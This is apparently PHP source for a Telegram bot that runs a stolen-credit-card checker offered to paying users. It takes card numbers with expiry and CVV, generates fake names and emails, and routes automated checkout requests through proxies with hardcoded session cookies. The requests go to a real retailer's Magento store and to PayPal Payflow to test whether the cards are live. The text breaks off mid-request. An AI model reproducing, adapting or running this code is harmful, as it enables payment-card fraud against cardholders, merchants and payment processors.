<?php


$ownerData = file_get_contents('database/owner.txt');
if (strpos($ownerData, "$userId") !== false) {
    $rank = "OWNER"; 
} else {
    $paidData = file_get_contents('database/paid.txt');
    $pattern = "/User ID: $userId\nRank: (.+)\n/";
    if (preg_match($pattern, $paidData, $matches)) {
        $rank = $matches[1];
    } else {
        $rank = "FREE";
    }
}


if((strpos($text, '/plw') === 0) or (strpos($text, '.plw') === 0) or ((strpos($text, '$plw') === 0) or (strpos($text, '!plw') === 0)) or ((strpos($text, '+plw') === 0) or (strpos($text, '#plw') === 0)) or (strpos($text, '?plw') === 0)) {


$userData = file_get_contents('database/users.txt');
if (strpos($userData, $userId) === false) {
bot('sendMessage', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>Unregistered User! ⚠️</code>
[↯]Message: <code>You have to register first to use me</code>
You have to use <code>/register</code> to use me 
- - - - - - - - - - - - - - - - - - - - - -
</b>",
    'reply_to_message_id' => $message_id,
    'parse_mode' => 'html'
]);
return;
}


if (strlen($message) <= 4) {
            bot('sendMessage', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - - 
[WRONG FORMAT] ⚠️
- - - - - - - - - - - - - - - - - - - - - -
Ex: <code>/chk cc|mm|yy|cvv</code>     
Gateway <code>PlayFlow AVS</code>        
- - - - - - - - - - - - - - - - - - - - - -
</b>",
        'reply_to_message_id' => $message_id,
        'parse_mode' => 'html'
    ]);
return;
}  

$paid = file_get_contents('database/paid.txt');
if (preg_match('/User ID:\s*(\d+)/', $paid, $matches)) {
$paids = $matches[1];
}
  
$owner = file_get_contents('database/owner.txt');
$owners = explode("\n", $owner);

$authgrp = file_get_contents('database/authgrp.txt');
$authgrps = explode("\n", $authgrp);

if (!preg_match($pattern, $paidData, $matches) && !in_array($chatId, $owners)) {

if (!in_array($chatId, $authgrps)) {
      
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>Not Allowed Here!⚠️</code>
[↯]Message: <code>Contact the Owner to authorize</code>
- - - - - - - - - - - - - - - - - - - - - -
</b>",
            'reply_to_message_id' => $message_id,
            'parse_mode' => 'html'
        ]);
        return;
    }
}


$spamResult = isSpamming($userId);
if ($spamResult !== false) {
bot('sendMessage', [
    'chat_id' => $chat_id,
    'message_id' => $message_id,
    'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ANTISPAM DETECTED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯] Try again after $spamResult seconds !
- - - - - - - - - - - - - - - - - - - - - -
</b>",
    'reply_to_message_id' => $message_id,
    'parse_mode' => 'html'
]);
return;
}  



//=========MAIN CODE===========//
$start_time = microtime(true);

$messageidtoedit50 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Started checking...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id,

        ]);

        $messageidtopfw = capture(json_encode($messageidtoedit50), '"message_id":', ',');
        
  if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}


$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$lista = (''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');


$last4 = substr($cc, -4);

//=========BANNED BIN=============//
$bin = substr($cc, 0, 6);
$bannedBins = file("banned.txt", FILE_IGNORE_NEW_LINES);

if (in_array($bin, $bannedBins)) {
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopfw,
            'text'=>"<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]BIN BANNED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯]CC: <code>$lista</code>
[↯]Reason: <code>All Prepaid banned!</code>
 - - - - - - - - - - - - - - - - - - - - - -
</b>",
            'parse_mode'=>'html',
            
        ]);
return;
}

//---------------------//
bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopfw,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: PayFlow AVS
Status: <code>■□□□□ 20%[🟥]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);



function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

function pro($stringlength = 16) {
    return substr(str_shuffle(str_repeat($string='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', ceil($stringlength/strlen($string)) )),1,$stringlength);
}

#$key = pro();
$web = pro();  
  
  
  
  function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];





//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

  
//==============[Randomizing Details-END]======================//

bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopfw,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: PayFlow AVS
Status: <code>□■□□□ 40%[🟦]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);

//==================[BIN LOOK-UP]======================//
$fim = json_decode(file_get_contents('https://bins.antipublic.cc/bins/'.$bin), true);
$bin1 = $fim["bin"] ?? null;

    if ($bin1 !== null) {
        $brand = $fim["brand"];
        $country = $fim["country"];
        $country_name = $fim["country_name"];
        $country_flag = $fim["country_flag"];
        
        $country_currencies = $fim["country_currencies"];
        $bank = $fim["bank"];
        $level = $fim["level"];
        $type = $fim["type"];
    }
//==================[BIN LOOK-UP-END]======================//

 
//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://herko.com/Retail/checkout/cart/add/uenc/aHR0cHM6Ly9oZXJrby5jb20vUmV0YWlsL2hlcmtvLWVuZ2luZS1jcmFua3NoYWZ0LXBvc2l0aW9uLXNlbnNvci1ja3AyMTgxLWZvci1lYWdsZS1taXRzdWJpc2hpLTE5OTQtMTk5OC5odG1s/product/28334/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: herko.com';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: multipart/form-data; boundary=----'.$web.'';
$headers[] = 'Path: /Retail/checkout/cart/add/uenc/aHR0cHM6Ly9oZXJrby5jb20vUmV0YWlsL2hlcmtvLWVuZ2luZS1jcmFua3NoYWZ0LXBvc2l0aW9uLXNlbnNvci1ja3AyMTgxLWZvci1lYWdsZS1taXRzdWJpc2hpLTE5OTQtMTk5OC5odG1s/product/28334/';
$headers[] = 'Cookie: PHPSESSID=521e857f9a56a286725a538273f37159; form_key=42d4uy3SeUP95BMA; mage-messages=; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; XSRF-TOKEN=eyJpdiI6IjdIaXB4aDFtK2wwR2ZvS1ZnL1Z5NkE9PSIsInZhbHVlIjoiZXI5QjlmQ1dVRHc4UHJmUmE0MVlGd05taEpmT1Q3TmpDa2JVV1UxWitVM0ljNWpXLzQycGMxR3VNTHhKWi9HZ0svTkNGZHRjS0x5YVNNeTVkOTdEdTNwaS9EZFMxcXJML1BpU1pXM1k0cE54dXArdncvZkUzdGxiTUsvU25jK0kiLCJtYWMiOiJjMjM5Mjk0ZjhjZTg0Yjc0ZGM2MDQ3MTRhZTU5MGMxZDkyN2VmNTE3ODU1NjIwMjRkMjI0NzQ1YWQxNjQwNTU3IiwidGFnIjoiIn0%3D; webapp_session=eyJpdiI6ImkybW5nblJaN3lvNExnQ1hmSUFPS0E9PSIsInZhbHVlIjoiUUdxL2pObDRwMENMdVViK2xSK0VqQWxBblNDbHRyU20yZitULzVHbjM5eVNhT2VEeXkxK2pOYWZLcUpjM05tOWJBeWY5RnVOMnk1MmtEYy9OL0lFZHExRXJlcmV5WkpFR0pLcE9kZ2ZndWNmVXdtV2owa08rNlQyOTRLM1lQVXEiLCJtYWMiOiI4ZDFmN2IxODUxZjVkYjQyZWMyZGVmNjFkNTk4YjNlMGI1NGQ0OTQ3NmI5NmQ1YzE1ODI4ZjViYjBmY2M4MzA4IiwidGFnIjoiIn0%3D; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D';
$headers[] = 'Origin: https://herko.com';
$headers[] = 'Referer: https://herko.com/Retail/herko-engine-crankshaft-position-sensor-ckp2181-for-eagle-mitsubishi-1994-1998.html';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36';
$headers[] = 'X-Requested-With: XMLHttpRequest';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------'.$web.'
Content-Disposition: form-data; name="product"

28334
------'.$web.'
Content-Disposition: form-data; name="selected_configurable_option"


------'.$web.'
Content-Disposition: form-data; name="related_product"


------'.$web.'
Content-Disposition: form-data; name="item"

28334
------'.$web.'
Content-Disposition: form-data; name="form_key"

42d4uy3SeUP95BMA
------'.$web.'
Content-Disposition: form-data; name="qty"

1
------'.$web.'--
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result = curl_exec($ch);




bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtopfw,
            'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: PayFlow AVS
Status: <code>□□■□□ 60%[🟨]</code>
Req: <code>@$username</code>
</b>",
            'parse_mode'=>'html',
            
        ]);
//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://herko.com/Retail/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: herko.com';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Path: /Retail/checkout/';
$headers[] = 'Cookie: PHPSESSID=521e857f9a56a286725a538273f37159; form_key=42d4uy3SeUP95BMA; mage-messages=; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=1ddb04fa9c06d9f797f169d9c5b9ecde; section_data_ids=%7B%22cart%22%3A1694591856%2C%22directory-data%22%3A1694591856%7D; XSRF-TOKEN=eyJpdiI6ImpldEJzYU84UXhma2xLZzF1N3hNOUE9PSIsInZhbHVlIjoibUlrU0RzZWRhVzNsSjMrbHV0T21jeDl5U3hOSnNvTTZJRlhUVGVWTmIwWE0rZlZHV0U0cFNMWjB1U0VDYnR5OGxtWC9FOGZMbHBzSTMvZE4renFuSzlRSHBVS0IwL0IvZmpkWHFYK01ORzZpSFA5SHNiMm9ZaWMwMHVKbU5PUVYiLCJtYWMiOiI5YThjZmM2YjMzYjZhZGQxODE5Nzg5NmVhZGY3MmM0MDBlNTQ0YWJiMmYzYmVhMzAwY2IyYzJmMWU1ZjkzY2RhIiwidGFnIjoiIn0%3D; webapp_session=eyJpdiI6IkJMWWZ0dkFSUTJ5ZGN0bmRFZEVTUVE9PSIsInZhbHVlIjoiSitQS2wxOWQvbEFSYlAwc2V3aXpWSm5ESVFyME1DZ3g2YnBvTktSWXN5SkRRV253MzVWR1hNQzVkbkdtek1FM2dmYXRmRWV3S0VvV1k5MXlhWnBxc3NKWk1BRHZXRXFicTVoazNOemJPN3hadEpDSGt3WFRraVJ1a0N0d1hVSnQiLCJtYWMiOiIzMzg4NDM4YzgwMTQzNGU3MDAxN2Y0OWI1ZTcxOWU2NTE0OWY2YjVkYzQ1NzU2ZjgyMjQ5M2FiY2U4OThiZGZhIiwidGFnIjoiIn0%3D';
$headers[] = 'Referer: https://herko.com/Retail/checkout/cart/';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result1 = curl_exec($ch);

$merchant = trim(strip_tags(getStr($result1, '"merchantId":"','"')));
$enbearer = trim(strip_tags(getstr($result1, '"clientToken":"','",')));
$decode = base64_decode($enbearer);
$bearer = trim(strip_tags(getstr($decode, '"authorizationFingerprint":"','",')));


//=======================[5 REQ]==================================//

//-------------------Req 2--------------//
//=================REQ 4===============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://herko.com/Retail/rest/default/V1/guest-carts/ZATSdmFGFUBfqNF3iycEjZHMgtR2bgS7/set-payment-information');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: herko.com';
$headers[] = 'path: /Retail/rest/default/V1/guest-carts/ZATSdmFGFUBfqNF3iycEjZHMgtR2bgS7/set-payment-information';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.5';
$headers[] = 'content-type: application/json';
$headers[] = 'cookie: PHPSESSID=521e857f9a56a286725a538273f37159; form_key=42d4uy3SeUP95BMA; mage-messages=; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=1ddb04fa9c06d9f797f169d9c5b9ecde; XSRF-TOKEN=eyJpdiI6ImpldEJzYU84UXhma2xLZzF1N3hNOUE9PSIsInZhbHVlIjoibUlrU0RzZWRhVzNsSjMrbHV0T21jeDl5U3hOSnNvTTZJRlhUVGVWTmIwWE0rZlZHV0U0cFNMWjB1U0VDYnR5OGxtWC9FOGZMbHBzSTMvZE4renFuSzlRSHBVS0IwL0IvZmpkWHFYK01ORzZpSFA5SHNiMm9ZaWMwMHVKbU5PUVYiLCJtYWMiOiI5YThjZmM2YjMzYjZhZGQxODE5Nzg5NmVhZGY3MmM0MDBlNTQ0YWJiMmYzYmVhMzAwY2IyYzJmMWU1ZjkzY2RhIiwidGFnIjoiIn0%3D; webapp_session=eyJpdiI6IkJMWWZ0dkFSUTJ5ZGN0bmRFZEVTUVE9PSIsInZhbHVlIjoiSitQS2wxOWQvbEFSYlAwc2V3aXpWSm5ESVFyME1DZ3g2YnBvTktSWXN5SkRRV253MzVWR1hNQzVkbkdtek1FM2dmYXRmRWV3S0VvV1k5MXlhWnBxc3NKWk1BRHZXRXFicTVoazNOemJPN3hadEpDSGt3WFRraVJ1a0N0d1hVSnQiLCJtYWMiOiIzMzg4NDM4YzgwMTQzNGU3MDAxN2Y0OWI1ZTcxOWU2NTE0OWY2YjVkYzQ1NzU2ZjgyMjQ5M2FiY2U4OThiZGZhIiwidGFnIjoiIn0%3D; section_data_ids=%7B%22cart%22%3A1694591856%2C%22directory-data%22%3A1694591856%2C%22messages%22%3A1694592228%7D';
$headers[] = 'origin: https://herko.com';
$headers[] = 'referer: https://herko.com/Retail/checkout/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'; 
$headers[] = 'x-requested-with: XMLHttpRequest';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"ZATSdmFGFUBfqNF3iycEjZHMgtR2bgS7","paymentMethod":{"method":"payflowpro","additional_data":{"cc_type":"VI","cc_exp_year":"'.$ano.'","cc_exp_month":"'.$mes.'","cc_last_4":"'.$last4.'"}},"email":"'.$email.'","billingAddress":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["5th Ave"],"company":"Ab workout ltd ","telephone":"09235623261","postcode":"10080","city":"New York","firstname":"'.$firstname.'","lastname":"'.$lastname.'","saveInAddressBook":null}}
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result2 = curl_exec($ch);
$response_array = json_decode($result2, true);
if ($response_array !== null) {
    $msg = $response_array['message'];
    


//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://herko.com/Retail/paypal/transparent/requestSecureToken/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: herko.com';
$headers[] = 'path: /Retail/paypal/transparent/requestSecureToken/';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'accept-language: en-US,en;q=0.5';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'cookie: PHPSESSID=521e857f9a56a286725a538273f37159; form_key=42d4uy3SeUP95BMA; mage-messages=; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=1ddb04fa9c06d9f797f169d9c5b9ecde; XSRF-TOKEN=eyJpdiI6ImpldEJzYU84UXhma2xLZzF1N3hNOUE9PSIsInZhbHVlIjoibUlrU0RzZWRhVzNsSjMrbHV0T21jeDl5U3hOSnNvTTZJRlhUVGVWTmIwWE0rZlZHV0U0cFNMWjB1U0VDYnR5OGxtWC9FOGZMbHBzSTMvZE4renFuSzlRSHBVS0IwL0IvZmpkWHFYK01ORzZpSFA5SHNiMm9ZaWMwMHVKbU5PUVYiLCJtYWMiOiI5YThjZmM2YjMzYjZhZGQxODE5Nzg5NmVhZGY3MmM0MDBlNTQ0YWJiMmYzYmVhMzAwY2IyYzJmMWU1ZjkzY2RhIiwidGFnIjoiIn0%3D; webapp_session=eyJpdiI6IkJMWWZ0dkFSUTJ5ZGN0bmRFZEVTUVE9PSIsInZhbHVlIjoiSitQS2wxOWQvbEFSYlAwc2V3aXpWSm5ESVFyME1DZ3g2YnBvTktSWXN5SkRRV253MzVWR1hNQzVkbkdtek1FM2dmYXRmRWV3S0VvV1k5MXlhWnBxc3NKWk1BRHZXRXFicTVoazNOemJPN3hadEpDSGt3WFRraVJ1a0N0d1hVSnQiLCJtYWMiOiIzMzg4NDM4YzgwMTQzNGU3MDAxN2Y0OWI1ZTcxOWU2NTE0OWY2YjVkYzQ1NzU2ZjgyMjQ5M2FiY2U4OThiZGZhIiwidGFnIjoiIn0%3D; section_data_ids=%7B%22cart%22%3A1694591856%2C%22directory-data%22%3A1694591856%2C%22messages%22%3A1694592228%7D';
$headers[] = 'origin: https://herko.com';
$headers[] = 'referer: https://herko.com/Retail/checkout/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'; 
$headers[] = 'x-requested-with: XMLHttpRequest';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_key=42d4uy3SeUP95BMA&captcha_form_id=payment_processing_request&payment%5Bmethod%5D=payflowpro&billing-address-same-as-shipping=on&captcha_form_id=co-payment-form&controller=checkout_flow&cc_type=VI
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result3 = curl_exec($ch);
$stok = trim(strip_tags(getstr($result3, '"securetoken":"','"')));
$stokid = trim(strip_tags(getstr($result3, '"securetokenid":"','"')));


//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payflowlink.paypal.com/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: payflowlink.paypal.com';
